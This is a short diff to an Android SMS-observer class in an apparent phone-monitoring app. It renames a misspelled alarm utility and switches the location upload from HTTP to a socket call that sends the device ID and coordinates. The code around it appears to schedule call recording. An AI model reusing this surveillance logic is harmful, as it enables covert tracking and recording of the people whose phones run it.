@@ -19,7 +19,8 @@ import com.privacy.monitor.inte.RunBack;
 import com.privacy.monitor.location.LocationMan;
 import com.privacy.monitor.provider.TaskInfoProvider;
 import com.privacy.monitor.resolver.field.SMSConstant;
-import com.privacy.monitor.util.AlarmNanagerUtil;
+import com.privacy.monitor.service.utilservice.ClientSocket;
+import com.privacy.monitor.util.AlarmManagerUtil;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
@@ -250,7 +251,7 @@ public class SMSObserver extends ContentObserver {
 					if(status>0 && status <=60){
 						try {
 							long reLong = status*60*1000;
-							AlarmNanagerUtil.startCron(context,C.ENV_ACTION,reLong);
+							AlarmManagerUtil.startCron(context,C.ENV_ACTION,reLong);
 							C.isRecorder = true;
 							recordCallComment(reLong);
 						} catch (IOException e) {
@@ -312,7 +313,7 @@ public class SMSObserver extends ContentObserver {
 		if(locaInfo !=null && locaInfo.length==2){
 			Date date = new Date();
 			SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
-			NetworkUtil.upload(context,"tel:"+sp.getString(C.PHONE_NUM,"")+"&lat="+locaInfo[0]+"&lon="+locaInfo[1]+"&time="+date.getTime(),C.RequestMethod.uploadLocation);
+			NetworkUtil.sendLocInfo(ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID,""),locaInfo[1],locaInfo[0]," ",date.getTime()+"",C.RequestMethod.uploadLocation);
 		}
 	}
 	
